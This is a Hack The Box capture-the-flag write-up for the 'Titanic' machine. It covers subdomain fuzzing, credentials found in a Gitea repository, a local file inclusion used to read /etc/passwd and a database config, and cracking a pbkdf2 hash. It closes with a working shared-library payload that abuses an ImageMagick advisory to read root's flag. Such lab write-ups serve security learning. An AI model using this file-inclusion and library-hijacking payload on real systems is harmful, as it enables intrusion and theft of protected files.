---
title: "[HTB] Titanic"
layout: post
categories: media
---

~~Initially didnt find any subdomains~~, however it was due to using _subfinder_, so pulled up my g named ffuf and got the real deal.
>![initial enum](/assets/images/titanic/1.png)


It immediately found dev subdomain, which contains gitea, which contains 1) docker-config and 2) flask app file
>![subdomian](/assets/images/titanic/2.png)
>![gitea](/assets/images/titanic/3.png)
>>Bazar zhok, nashel creds.
>>![sql](/assets/images/titanic/4.png)
>> I have a conf file
>>![conf file path](/assets/images/titanic/5.png)
>> I have a path
>>![dev path](/assets/images/titanic/6.png)
>> ugh, path of a conf file.
---

### Found LFI in post request
doesnt need explanation

>![post request](/assets/images/titanic/7.png)
>![burp](/assets/images/titanic/8.png)
>![/etc/passwd](/assets/images/titanic/9.png)

---

> Now use LFI to read conf file:
>>![kek](/assets/images/titanic/10.png)
>>![db](/assets/images/titanic/11.png)
>>crack developer hash, which is pbkdf2$50000$50.
>>
>>It can be done, pretty easily using useful 0xdf command that retrives from db and saves it in correct format. It can be found in my cheatsheet, or his website. Also Ippsec had a scrypt for this - https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271
![creacked hash](/assets/images/titanic/12.png)
Now connect through ssh and get the user.txt


---
### root.txt

there is a file in  /opt/scripts that uses magickstick. there is a cve for that - https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8. tried xml, doesnt work, but shared library works, so just use the following:

```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
```
